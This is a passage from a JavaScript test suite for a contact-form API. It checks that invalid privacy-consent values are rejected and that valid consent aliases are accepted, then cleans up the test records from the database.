        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: { 'x-forwarded-for': generateUniqueIp() },
          body: {
            name: 'Consent Tester',
            email: generateTestEmail('t5_privacy_reject'),
            subject: 'Consent Testing',
            message: 'Testing invalid privacy flag',
            privacy: badPrivacy,
          },
        });

        const res = await contactHandler(req);
        assertEqual(res.status, 400, `Privacy value "${JSON.stringify(badPrivacy)}" MUST be rejected with 400`);
        const data = await res.json();
        assertIncludes(data.error, 'privacy', 'Error should explain missing privacy consent');
      }
    });

    await runner.test('T5.5.7: All valid Privacy Consent aliases accepted (privacy: true, gdpr_consent: true, consent: true, "true")', async () => {
      const contactHandler = await getContactRouteHandler();
      const validConsentVariations = [
        { privacy: true },
        { privacy: 'true' },
        { gdpr_consent: true },
        { consent: true },
      ];

      for (const consentVar of validConsentVariations) {
        const email = generateTestEmail('t5_privacy_valid');
        createdEmails.push(email);

        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: { 'x-forwarded-for': generateUniqueIp() },
          body: {
            name: 'Valid Consent Customer',
            email,
            subject: 'Richiesta Con Consenso Valido',
            message: 'Verifica accettazione variante consenso privacy',
            ...consentVar,
          },
        });

        const res = await contactHandler(req);
        assertEqual(res.status, 200, `Consent variation ${JSON.stringify(consentVar)} must be accepted with 200`);
        const data = await res.json();
        if (data.ticket_id) createdMessageIds.push(data.ticket_id);
      }
    });

  } finally {
    // Database teardown & cleanup
    console.log('\n\x1b[90mCleaning up test artifacts from Supabase...\x1b[0m');
    await cleanupTestData({ emails: createdEmails, messageIds: createdMessageIds });
    console.log('\x1b[90mCleanup complete.\x1b[0m');
  }

  return runner;
}
